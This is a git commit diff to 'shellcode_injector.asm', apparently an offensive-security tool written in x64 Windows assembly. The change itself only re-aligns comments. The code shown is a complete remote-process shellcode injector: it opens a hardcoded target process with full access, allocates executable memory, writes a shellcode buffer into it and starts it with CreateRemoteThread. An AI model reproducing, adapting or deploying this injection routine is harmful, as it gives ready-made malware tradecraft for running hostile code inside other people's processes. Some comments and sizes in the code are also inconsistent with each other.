95b8f197a2cd3f8157ee8fb81f0624d6d430eeb7
Angelo F.C <98479572+lem0nSec@users.noreply.github.com>
2022-12-07 20:18:50 +0100

    Update shellcode_injector.asm

--- shellcode_injector.asm
+++ shellcode_injector.asm
@@ -27,57 +27,57 @@ _start:
 	xor r8, r8
 	mov rdx, r8							; 0 (FALSE)
 	mov rcx, r8
-	mov rcx, 0x1fffff				; PROCESS_ALL_ACCESS
-	add r8, 5068						; DWORD processID
-	call OpenProcess				; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5068)
-	mov r14, rax						; storing the handle (hProcess) into r14
+	mov rcx, 0x1fffff						; PROCESS_ALL_ACCESS
+	add r8, 5068							; DWORD processID
+	call OpenProcess						; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 5068)
+	mov r14, rax							; storing the handle (hProcess) into r14
 	
 ; 2) allocate 0x400 bytes of memory in the target process
 	xor rdx, rdx
-	mov DWORD [ss:rsp+0x20], 0x40  		; PAGE_EXECUTE_READWRITE (5th arg goes on the stack)
-	mov r9, 0x1000 										; MEM_COMMIT
-	mov r8, 0x400 						; dwSize
-	mov rcx, rax 						; hProcess
+	mov DWORD [ss:rsp+0x20], 0x40					; PAGE_EXECUTE_READWRITE (5th arg goes on the stack)
+	mov r9, 0x1000							; MEM_COMMIT
+	mov r8, 0x400							; dwSize
+	mov rcx, rax							; hProcess
 	mov rax, QWORD [ds:VirtualAllocEx]
 	call rax							; VirtualAllocEx(hProcess, 0, MEM_COMMIT, PAGE_READWRITE_EXECUTE)
-	mov r13, rax						; storing the allocation base into r13
+	mov r13, rax							; storing the allocation base into r13
 	
 
 ; 3) Write shellcode into the remote process
 	xor rcx, rcx
-	mov QWORD [ss:rsp+0x20], rcx		; dwBytesWritten (5th arg goes on the stack)
-	mov rcx, r14						; hProcess
-	mov rdx, r13						; base of the new remote memory region (allocate)
-	lea r8, [shellcode]					; LPCVOID shellcode
-	mov r9, 0x400  						; sizeof(allocate)
+	mov QWORD [ss:rsp+0x20], rcx					; dwBytesWritten (5th arg goes on the stack)
+	mov rcx, r14							; hProcess
+	mov rdx, r13							; base of the new remote memory region (allocate)
+	lea r8, [shellcode]						; LPCVOID shellcode
+	mov r9, 0x400 							; sizeof(allocate)
 	mov rax, QWORD [ds:WriteProcessMemory]
 	call rax							; WriteProcessMemory(hProcess, allocate, shellcode, 0x400, NULL)
 
 
 ; 4) Execute shellcode by creating a new thread
-	mov rcx, r14						; hProcess
-	xor rdx, rdx						; 0
+	mov rcx, r14							; hProcess
+	xor rdx, rdx							; 0
 	mov r8, rdx							; 0
 	mov r9, r13							; allocate
-	mov QWORD [ss:rsp+0x20], rdx		; 0
-	mov QWORD [ss:rsp+0x28], rdx		; 0
-	mov QWORD [ss:rsp+0x30], rdx		; 0
+	mov QWORD [ss:rsp+0x20], rdx					; 0
+	mov QWORD [ss:rsp+0x28], rdx					; 0
+	mov QWORD [ss:rsp+0x30], rdx					; 0
 	mov rax, QWORD [ds:CreateRemoteThread]
 	call rax							; CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)allocate, 0, 0, 0)
 	
 	cmp rax, 0
-	jz _free_memory						; if CreateRemoteThread fails then jump to _free_memory, otherwise...
+	jz _free_memory							; if CreateRemoteThread fails then jump to _free_memory, otherwise...
 
-	mov r15, rax						; ...store remote thread handle into r15
-	mov rcx, rax						; hThread
-	mov rdx, 0xFFFFFFFF					; INFINITE
+	mov r15, rax							; ...store remote thread handle into r15
+	mov rcx, rax							; hThread
+	mov rdx, 0xFFFFFFFF						; INFINITE
 	mov rax, QWORD [ds:WaitForSingleObject]
 	call rax							; WaitForSingleObject(hThread, INFINITE)
-										; if success...
+									; if success...
 	mov rcx, r15
-	call _close_handle					; ...close out hThread...
+	call _close_handle						; ...close out hThread...
 	mov rcx, r14
-	call _close_handle					; ...and hProcess
+	call _close_handle						; ...and hProcess
 	jmp _exit							; go to _exit
 
 
@@ -88,10 +88,10 @@ _close_handle:
 	
 
 _free_memory:
-	mov rcx, r14						; hProcess
-	mov rdx, r13						; allocate
-	mov r8, 0x100						; sizeof(allocate)
-	mov r9, 0x00004000					; MEM_DECOMMIT
+	mov rcx, r14							; hProcess
+	mov rdx, r13							; allocate
+	mov r8, 0x100							; sizeof(allocate)
+	mov r9, 0x00004000						; MEM_DECOMMIT
 	mov rax, QWORD [ds:VirtualFreeEx]
 	call rax							; VirtualFreeEx(hProcess, allocate, sizeof(allocate), MEM_DECOMMIT)
 	jmp _exit
